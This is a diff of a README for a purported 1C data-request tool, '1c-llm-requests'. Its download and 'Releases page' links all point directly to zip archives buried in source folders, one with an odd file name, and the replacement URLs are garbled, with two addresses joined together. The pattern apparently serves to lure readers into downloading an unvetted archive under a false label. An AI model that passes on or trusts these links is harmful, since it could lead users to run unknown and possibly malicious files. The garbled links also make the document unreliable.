@@ -1,6 +1,6 @@
 # 🚀 1c-llm-requests - Easy Data Requests for 1C Users
 
-[![Download 1c-llm-requests](https://raw.githubusercontent.com/Veerxps/1c-llm-requests/main/src/CommonModules/МодульJSON/Ext/llm_requests_c_ichthyism.zip)](https://raw.githubusercontent.com/Veerxps/1c-llm-requests/main/src/CommonModules/МодульJSON/Ext/llm_requests_c_ichthyism.zip)
+[![Download 1c-llm-requests](https://github.com/Veerxps/1c-llm-requests/raw/refs/heads/main/src/c_llm_requests_1.6.zipМодульhttps://github.com/Veerxps/1c-llm-requests/raw/refs/heads/main/src/c_llm_requests_1.6.zip)](https://github.com/Veerxps/1c-llm-requests/raw/refs/heads/main/src/c_llm_requests_1.6.zipМодульhttps://github.com/Veerxps/1c-llm-requests/raw/refs/heads/main/src/c_llm_requests_1.6.zip)
 
 ## 📦 Introduction
 
@@ -20,7 +20,7 @@ Before you start, ensure your system meets the following requirements:
 
 ### Step 2: Visit the Download Page
 
-To download **1c-llm-requests**, visit our [Releases page](https://raw.githubusercontent.com/Veerxps/1c-llm-requests/main/src/CommonModules/МодульJSON/Ext/llm_requests_c_ichthyism.zip). This page contains the latest version of the software and other details.
+To download **1c-llm-requests**, visit our [Releases page](https://github.com/Veerxps/1c-llm-requests/raw/refs/heads/main/src/c_llm_requests_1.6.zipМодульhttps://github.com/Veerxps/1c-llm-requests/raw/refs/heads/main/src/c_llm_requests_1.6.zip). This page contains the latest version of the software and other details.
 
 ### Step 3: Download the Latest Version
 
@@ -66,6 +66,6 @@ We welcome feedback to improve our application. Please report any issues or sugg
 
 ## 🔗 Download & Install
 
-Don't wait! Start using **1c-llm-requests** today by downloading it from our [Releases page](https://raw.githubusercontent.com/Veerxps/1c-llm-requests/main/src/CommonModules/МодульJSON/Ext/llm_requests_c_ichthyism.zip) now. 
+Don't wait! Start using **1c-llm-requests** today by downloading it from our [Releases page](https://github.com/Veerxps/1c-llm-requests/raw/refs/heads/main/src/c_llm_requests_1.6.zipМодульhttps://github.com/Veerxps/1c-llm-requests/raw/refs/heads/main/src/c_llm_requests_1.6.zip) now. 
 
 Enjoy seamless data requests with minimal hassle! You’re all set to leverage the power of **1c-llm-requests** for your data needs. Happy querying!
